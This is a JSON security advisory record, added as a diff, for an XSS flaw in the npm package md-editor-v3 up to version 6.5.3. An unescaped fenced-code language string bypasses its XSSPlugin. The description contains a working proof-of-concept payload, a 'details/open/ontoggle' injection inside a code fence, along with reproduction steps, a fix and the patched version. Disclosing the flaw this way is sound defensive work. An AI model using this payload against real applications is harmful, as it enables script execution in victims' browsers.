@@ -1,0 +1,56 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-09-18T17:17:38Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "md-editor-v3"
+  },
+  "Advisory": {
+    "DatabaseId": 499952,
+    "Id": "GSA_kwCzR0hTQS0zcm0yLWg3OWMtOHF3Ns4AB6Dw",
+    "GhsaId": "GHSA-3rm2-h79c-8qw6",
+    "References": [
+      {
+        "Url": "https://github.com/imzbf/md-editor-v3/security/advisories/GHSA-3rm2-h79c-8qw6"
+      },
+      {
+        "Url": "https://github.com/imzbf/md-editor-v3/commit/2c07360420e74087f5bc63032ab155d93e0a0b10"
+      },
+      {
+        "Url": "https://github.com/imzbf/md-editor-v3/releases/tag/v6.5.4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-3rm2-h79c-8qw6"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-3rm2-h79c-8qw6"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-84992"
+      }
+    ],
+    "Description": "### Summary\n`MdPreview` interpolates a fenced-code language into HTML attributes without escaping it. A crafted info string therefore executes JavaScript even when the shipped `XSSPlugin` is enabled.\n\n### Details\n`useMarkdownIt()` (`packages/MdEditor/layouts/Content/composition/useMarkdownIt.ts:206`) registers a `highlight` callback whose final return inserts `language` into both `class=\"language-${language}\"` and an unquoted `language=${language}` attribute without escaping. Both highlighting paths reach this return. `XSSPlugin()` filters only existing `html_block` and `html_inline` tokens before rendering, so it cannot inspect this renderer-generated HTML.\n\n### PoC\nThe Vue application enables the shipped `XSSPlugin` and renders attacker-controlled Markdown. `noHighlight: true` only makes reproduction deterministic; the default highlighting path reaches the same unsafe return. Use this as `src/main.js`:\n\n```js\nimport { createApp, h } from 'vue';\nimport { MdPreview, XSSPlugin, config } from 'md-editor-v3';\n\nconfig({ markdownItPlugins: p =\u003e [...p, { type: 'xss', plugin: XSSPlugin, options: {} }] });\nconst markdown = '```x\"\u003e\u003cdetails/open/ontoggle=alert(document.domain)\u003e\\nSAFE\\n```';\ncreateApp({ render: () =\u003e h(MdPreview,\n  { editorId: 'poc', modelValue: markdown, noHighlight: true })\n}).mount('#app');\n```\n\nCreate and run the app, replacing `src/main.js` when indicated:\n\n```sh\nnpm create vite@latest poc -- --template vue\ncd poc\nnpm install\nnpm install md-editor-v3@6.5.3\n# Replace src/main.js with the code above.\nnpm run dev\n```\n\nOpening the displayed URL automatically shows the application hostname in an alert.\n\n### Impact\nAn attacker who can supply Markdown can execute JavaScript in the application origin when a victim renders it. If the host stores that Markdown, this becomes stored XSS.\n\n### Suggested fix\nEscape `language` with `md.utils.escapeHtml` before interpolation and quote the `language` attribute. Add this payload and the raw control as regression tests with `XSSPlugin` enabled.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-18T17:17:36Z",
+    "Severity": "MODERATE",
+    "Summary": "md-editor-v3: XSS via fenced-code language rendering bypass",
+    "UpdatedAt": "2026-09-18T17:17:38Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "6.5.4"
+      },
+      "VulnerableVersionRange": "\u003c= 6.5.3"
+    }
+  ]
+}
